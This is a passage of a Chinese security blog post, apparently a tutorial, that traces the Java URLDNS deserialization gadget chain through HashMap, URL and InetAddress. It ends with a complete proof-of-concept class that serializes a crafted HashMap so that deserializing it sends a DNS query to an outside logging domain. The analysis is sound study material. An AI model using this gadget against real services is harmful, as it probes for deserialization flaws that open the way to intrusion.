+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Read the keys and values, and put the mappings in the HashMap  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">mappings</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nd">@SuppressWarnings</span><span class="p">(</span><span class="s">&#34;unchecked&#34;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">K</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">K</span><span class="p">)</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nd">@SuppressWarnings</span><span class="p">(</span><span class="s">&#34;unchecked&#34;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">V</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">V</span><span class="p">)</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">putVal</span><span class="p">(</span><span class="n">hash</span><span class="p">(</span><span class="n">key</span><span class="p">),</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>HashMap</code>的键名计算了 hash，
+<code>putVal(hash(key), key, value, false, false);</code>
+跟进查看一下</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141127560.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141127560.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141127560.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141127560.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141127560.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141127560.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>调用了<code>key.hashCode()</code>，而这里的 key 是可控的，就是传入的<code>java.net.URL</code>，跟进查看一下</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141150723.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141150723.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141150723.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141150723.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141150723.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141150723.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里<code>hashCode==-1</code>，重新进行<code>hashCode()</code>方法计算，跟进<code>handler</code>查看调用了哪一个<code>hashCode()</code></p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141151442.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141151442.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141151442.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141151442.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141151442.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141151442.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><code>transient关键字，修饰 Java 序列化对象时，不需要序列化属性</code>也就是<code>handler</code>属性不参与序列化，直接跟进<code>URLStreamHandler</code>查看一下</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141152682.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141152682.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141152682.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141152682.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141152682.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141152682.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里调用了<code>getHostAddress</code>跟进查看一下</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141153663.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141153663.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141153663.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141153663.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141153663.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141153663.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>又调用了<code>java.net.URL</code>的<code>getHostAddress</code>方法
+继续跟进</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141154024.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141154024.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141154024.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141154024.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141154024.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141154024.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>进入到<code>InetAddress.getByName(host);</code>便会触发<code>DNS</code>请求
+继续回到<code>readObject()</code>中，看看如何给<code>key</code>赋值</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141230086.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141230086.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141230086.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141230086.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141230086.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141230086.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><code>key</code>是从<code>K key = (K) s.readObject();</code>这串代码，也就是<code>readObject</code>中得到的，说明之前是<code>writeObject</code>会写入 key
+HashMap#writeObject</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141232544.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141232544.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141232544.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141232544.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141232544.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141232544.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>进入了<code>internalWriteEntries()</code>跟进查看</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141232079.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141232079.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141232079.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141232079.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141232079.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141232079.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里的<code>key</code>以及<code>value</code>是从 tab 中取的，而 tab 的值即<code>HashMap</code>中 table 的值。
+想要修改table的值，就需要调用<code>HashMap#put</code>方法，而HashMap#put方法中也会对key调用一次hash方法，所以这里也会产生一次dns查询
+为了避免这次 dns 查询，我们将hashCode设置不为<code>-1</code>的其他值
+构造完整poc</p>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.URL</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">URLDNS</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">hashmap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">URL</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="s">&#34;http://47894df839.ipv6.1433.eu.org&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.net.URL&#34;</span><span class="p">).</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;hashCode&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">f</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">f</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">1</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashmap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">1</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">f</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="o">-</span><span class="n">1</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">b</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">hashmap</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">str</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">str</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>调用栈如下</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141314961.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141314961.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141314961.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141314961.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141314961.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141314961.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-01-14 00:12:12">Updated on 2024-01-14&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/fdfad53/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://nlrvana.github.io/posts/fdfad53/" data-title="URLDNS链详解" data-hashtags="URLDNS"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://nlrvana.github.io/posts/fdfad53/" data-hashtag="URLDNS"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://nlrvana.github.io/posts/fdfad53/" data-title="URLDNS链详解"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/urldns/" class="post-tag" title="Tags - URLDNS">URLDNS</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav">
+      <a href="/posts/ca4c9c3/" class="post-nav-item" rel="next" title="CommonsCollections1链详解">CommonsCollections1链详解<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.121.2"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.1"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="https://nlrvana.github.io"target="_blank" rel="external nofollow noopener noreferrer">N1Rvana</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
